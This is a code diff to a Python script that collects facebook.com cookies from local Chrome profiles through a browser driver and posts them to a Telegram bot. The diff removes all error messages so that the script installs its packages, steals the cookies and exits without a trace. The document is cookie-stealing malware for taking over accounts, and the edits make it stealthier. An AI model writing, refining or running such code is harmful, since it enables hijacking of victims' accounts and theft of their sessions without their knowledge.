@@ -22,8 +22,7 @@ def install_libraries():
         for lib in required_libs:
             if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                 subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error installing libraries: {e}")
+    except subprocess.CalledProcessError:
         sys.exit(1)
 
 def check_chrome_installed():
@@ -33,7 +32,6 @@ def check_chrome_installed():
         os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\" + os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
     ]
     if not any(os.path.exists(path) for path in possible_paths):
-        print("Error: Chrome is not installed.")
         sys.exit(1)
     return True
 
@@ -49,8 +47,7 @@ def get_cookies(profile_name):
         cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
         driver.quit()
         return cookies
-    except Exception as e:
-        print(f"Error with profile {profile_name}: {e}")
+    except Exception:
         return None
 
 def cookies_to_header_string(cookies):
@@ -61,9 +58,9 @@ def send_telegram(profile_cookies):
     try:
         response = requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
         if response.status_code != 200:
-            print(f"Error sending Telegram message: {response.text}")
-    except Exception as e:
-        print(f"Error sending Telegram message: {e}")
+            pass
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     install_libraries()
@@ -78,4 +75,4 @@ if __name__ == "__main__":
             profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
-    os._exit(0)  # Tự động đóng CMD
+    sys.exit(0)
